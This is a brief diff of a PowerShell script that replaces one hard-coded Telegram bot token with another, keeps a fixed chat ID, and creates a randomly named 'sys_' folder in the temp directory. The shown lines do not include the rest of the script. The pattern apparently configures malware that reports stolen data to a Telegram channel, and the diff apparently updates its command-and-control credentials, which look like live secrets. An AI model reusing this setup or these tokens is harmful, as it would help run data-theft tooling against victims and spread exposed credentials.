@@ -1,6 +1,6 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
+$token = "8755749287:AAHjCsIAhYq2gSk7e7EJC-jqQZjhN-5BE54"
 $chatId = "1940923712"
 
 $workDir = "$env:TEMP\sys_$(Get-Random)"
